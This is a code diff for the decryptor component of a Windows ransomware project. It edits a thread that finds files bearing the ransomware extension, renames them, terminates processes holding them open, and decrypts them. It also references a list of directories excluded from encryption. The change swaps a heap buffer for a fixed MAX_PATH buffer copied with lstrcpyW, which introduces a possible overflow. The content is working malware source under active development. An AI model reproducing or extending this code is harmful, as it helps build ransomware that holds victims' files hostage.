@@ -1,5 +1,3 @@
-#pragma comment(lib, "mpr.lib")
-
 #include "decryptor.h"
 #include <other/memory.h>
 #include <other/settings.h>
@@ -8,6 +6,7 @@
 #include "ecrypt-sync.h"
 #include "sha512.h"
 #include "crc32.h"
+#include <stdio.h>
 
 /* Directories that should not be encrypted. */
 static const wchar_t* IGNORE_DIRECTORIES[] = { L".", L"..", L"$windows.~bt",
@@ -218,10 +217,9 @@ cleanup:
 DWORD WINAPI decryptionThread(LPVOID lpParam)
 {
     UNREFERENCED_PARAMETER(lpParam);
-    static const DWORD DW_MILLISECONDS = 1000;
-
-    size_t pathLen;
-    wchar_t* filePath, * fileExtension, * newPath;
+    static const DWORD DW_MILLISECONDS = 1 * 1000;
+    
+    wchar_t* filePath, * fileExtension;
     while (TRUE)
     {
         DWORD bytesRead;
@@ -238,37 +236,32 @@ DWORD WINAPI decryptionThread(LPVOID lpParam)
             if (lstrcmpW(fileExtension, RANSOMWARE_EXTENSION) != 0)
                 goto cleanup;
             
-            pathLen = lstrlenW(filePath);
-            newPath = (wchar_t*)smalloc(pathLen + 1, sizeof(wchar_t));
+            wchar_t newPath[MAX_PATH];
             lstrcpyW(newPath, filePath);
-            newPath[pathLen - SIZE_OF_EXTENSION] = '\0';
+            newPath[lstrlenW(filePath) - SIZE_OF_EXTENSION] = '\0';
             
             if (!MoveFileExW(filePath, newPath, MOVEFILE_WRITE_THROUGH | MOVEFILE_REPLACE_EXISTING))
-                goto ncleanup;
-            
-            printf("Decrypting %ls\n", newPath);
+                goto cleanup;
             
             HANDLE hFile = CreateFileW(newPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
             if (hFile == INVALID_HANDLE_VALUE)
             {
                 if (GetLastError() != ERROR_SHARING_VIOLATION)
-                    goto ncleanup;
+                    goto cleanup;
 
                 // Try to close the processes that are using the file
                 if (!terminateFileProcesses(newPath))
-                    goto ncleanup;
-                
+                    goto cleanup;
+
                 // Successfully closed all processes that were using the file, retry opening it
                 hFile = CreateFileW(newPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
                 if (hFile == INVALID_HANDLE_VALUE)
-                    goto ncleanup;
+                    goto cleanup;
             }
             
             decryptFile(hFile);
             CloseHandle(hFile);
-
-        ncleanup:
-            sfree(newPath);
+            
         cleanup:
             sfree(filePath);
         }
